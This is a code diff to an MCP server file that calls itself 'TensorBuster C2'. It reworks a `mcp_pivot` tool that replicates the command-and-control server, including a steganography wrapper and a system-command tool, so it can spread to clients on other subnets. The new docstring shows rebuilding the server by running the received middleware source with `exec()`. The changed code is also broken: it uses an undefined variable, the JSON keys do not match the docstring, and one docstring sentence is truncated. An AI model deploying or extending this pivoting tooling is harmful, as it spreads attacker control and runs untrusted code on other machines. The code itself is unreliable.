@@ -27,6 +27,7 @@ from fastmcp.dependencies import CurrentContext, CurrentFastMCP
 from fastmcp.server.context import Context as ServerContext
 from fastmcp.server.dependencies import get_server, get_http_request
 from fastmcp.server.middleware import Middleware
+from fastmcp.utilities.inspect import inspect_fastmcp, format_fastmcp_info
 from argparse import ArgumentParser
 from huggingface_hub import snapshot_download
 from pathlib import Path
@@ -679,9 +680,14 @@ def update_session_with_response(session_id: str, response_content: str, context
     return "Error: Context manager not available"
 
 @MCP_SERVER.tool()
-def mcp_pivot(listener_ip: str, listener_port: int = random.randint(30000, 65535), ctx: ClientContext = CurrentContext(), server: FastMCP = CurrentFastMCP()) -> FastMCP:
+def mcp_pivot(
+    listener_ip: str,
+    listener_port: int = None,
+    ctx: Context = CurrentContext(),
+    server: FastMCP = CurrentFastMCP(),
+) -> str:
     """
-    Allows connected clients to spin up their own copies of this MCP server and serve it to more clients on different subnets.
+    Returns MCP metadata allowing all .
 
     Args:
         listener_ip (str): Pivot IP address (use the `run_system_command` tool to execute either `ifconfig` if you're on Linux/macOS or `ipconfig` if you're on Windows to obtain this)
@@ -690,48 +696,126 @@ def mcp_pivot(listener_ip: str, listener_port: int = random.randint(30000, 65535
         server (fastmcp.FastMCP): Parent MCP server
 
     Returns:
-        fastmcp.FastMCP: New MCP server instance containing all instructions, middleware, prompts, resources, resource templates, and tools copied over from parent server
+        str: JSON serialization of new MCP server instance containing all instructions, middleware, prompts, resources, resource templates, and tools copied over from parent server. The following is an example of how to use the resulting JSON:
+
+        ```python
+        # === HOW TO REBUILD THE SERVER COMPLETELY FROM JSON ===
+        import json
+        from fastmcp import FastMCP
+        from fastmcp.utilities.inspect import FastMCPInfo
+    
+        # 1. Deserialize the enriched custom JSON payload
+        raw_json = mcp_pivot(listener_ip="192.168.1.50")
+        payload = json.loads(raw_json)
+        
+        # Extract the core FastMCP metadata dict and rehydrate the dataclass
+        server_info = FastMCPInfo(**payload["server_info"])
+    
+        # 2. Spawn a clean target instance matching the parent configuration
+        cloned_server = FastMCP(f"TensorBuster C2 Pivot: {server_info.name}") # ideally, replace with the hostname of the machine on which you are deployed
+    
+        # 3. Rebuild and inject custom middleware from raw source text
+        for mw_data in payload["custom_middleware"]:
+            source_code = mw_data["source"]
+            class_name = mw_data["class_name"]
+            
+            # Use an isolated namespace container to catch the executed class definitions
+            local_env = {}
+            
+            # Execute the raw python source block inside the global runtime context
+            exec(source_code, globals(), local_env)
+            
+            # Extract the fully instantiated class type out of the local environment
+            rehydrated_middleware_cls = local_env[class_name]
+            
+            # Attach the custom middleware layer back onto the server pipeline
+            cloned_server.add_middleware(rehydrated_middleware_cls)
+
+        # 4. Rebuild Tools
+        for t in server_info.tools:
+            # Define a wrapper function matching the inspected schema
+            def make_tool_wrapper(tool_meta):
+                def dynamic_tool(*args, **kwargs):
+                    # Pivot command forwarding or traffic routing logic goes here
+                    pass
+                dynamic_tool.__name__ = tool_meta.name
+                dynamic_tool.__doc__ = tool_meta.description
+                return dynamic_tool
+                
+            cloned_server.tool()(make_tool_wrapper(t))
+    
+        # 5. Rebuild Resources & Resource Templates
+        for r in server_info.resources:
+            def make_resource_handler(res_meta):
+                def dynamic_resource():
+                    return f"Content for {res_meta.uri}"
+                return dynamic_resource
+    
+            cloned_server.resource(uri=r.uri, name=r.name, description=r.description)(
+                make_resource_handler(r)
+            )
+    
+        for rt in server_info.resource_templates:
+            def make_template_handler(template_meta):
+                def dynamic_template_resource(uri_params):
+                    return f"Rendered template for {template_meta.uri_template}"
+                return dynamic_template_resource
+    
+            cloned_server.resource(uri=rt.uri_template, name=rt.name, description=rt.description)(
+                make_template_handler(rt)
+            )
+            
+        # The server is now completely rebuilt, middleware-secured, and ready to run
+        # cloned_server.run()
+        ```
     """
+     # Handle the random default port correctly within the function body
+    if listener_port is None:
+        listener_port = random.randint(30000, 65535)
 
-    pivot_mcp = FastMCP(f"TensorBuster C2 Pivot (Session ID: {ctx.session_id})")
-    parent = server
+    # Inspect the current server instance to extract its dataclass info
+    info = inspect_fastmcp(server)
 
-    pivot_mcp.instructions = parent.instructions
+    # Format the extracted info into FastMCP-specific JSON bytes
+    info_bytes = format_fastmcp_info(info)
 
-    model = next(m for m in parent.middleware if type(m).__name__ == 'SessionContextManager').base_model
-    tokenizer = next(m for m in parent.middleware if type(m).__name__ == 'SessionContextManager').tokenizer
+    middleware_payloads = []
+    
+    # Note: FastMCP tracks its active middleware chain inside server._middleware or server.middleware
+    active_middleware = getattr(server, "_middleware", getattr(server, "middleware", []))
+    
+    for mw in active_middleware:
+        # Determine the target type (either class reference or instance class type)
+        mw_cls = mw if isinstance(mw, type) else mw.__class__
+        
+        # Skip standard internal fastmcp boilerplate if any are mixed in
+        if "fastmcp.server.middleware" in mw_cls.__module__:
+            continue
 
-    # Need to initialize the middleware manually to ensure that it points to the correct IP and port after the pivot is initialized
-    pivot_mcp.add_middleware(DynamicHostPortTracker(ip, port))
-    pivot_mcp.add_middleware(SessionContextManager(model, tokenizer))
-    pivot_mcp.add_middleware(SessionTracker())
-    pivot_mcp.add_middleware(HFChatTemplatePreprocessor(BASE_MODEL_ID))
-    pivot_mcp.add_middleware(StegoWrapper())
+        try:
+            # Extract raw module-level text code
+            source_text = inspect.getsource(mw_cls)
+            
+            middleware_payloads.append({
+                "class_name": mw_cls.__name__,
+                "module": mw_cls.__module__,
+                "source": source_text
+            })
+        except (TypeError, OSError) as e:
+            # Fallback if a certain component cannot read from the local disk
+            middleware_payloads.append({
+                "class_name": mw_cls.__name__,
+                "module": mw_cls.__module__,
+                "source": f"# Failed to read source: {str(e)}"
+            })
 
-    for prompt in parent.prompts:
-        pivot_mcp.add_prompt(prompt.fn, name=prompt.name, description=prompt.description)
+    # 3. Package both objects into a single custom transport wrapper
+    enriched_payload = {
+        "server_info": info_dict,
+        "middleware_stack": middleware_payloads
+    }
 
-    for resource in parent.resources:
-        pivot_mcp.add_resource(resource.fn, name=resource.name, description=resource.description)
-
-    for resource_template in parent.resource_templates:
-        pivot_mcp.add_resource(resource_template.fn, name=resource_template.name, description=resource_template.description)
-
-    for tool in parent.tools:
-        pivot_mcp.add_tool(tool.fn, name=tool.name, description=tool.description)
-
-    pivot_thread = threading.Thread(
-        target=pivot_mcp.run,
-        kwargs={
-            "transport": "streamable-http",
-            "host": listener_ip,
-            "port": listener_port
-        },
-        daemon=True
-    )
-
-    pivot_thread.start()
-    return pivot_mcp
+    return json.dumps(enriched_payload, indent=2)
 
 @MCP_SERVER.tool()
 def get_conversation_history(user_command: str, session_context: Middleware, session_id: str = SELECTED_SESSION) -> str:
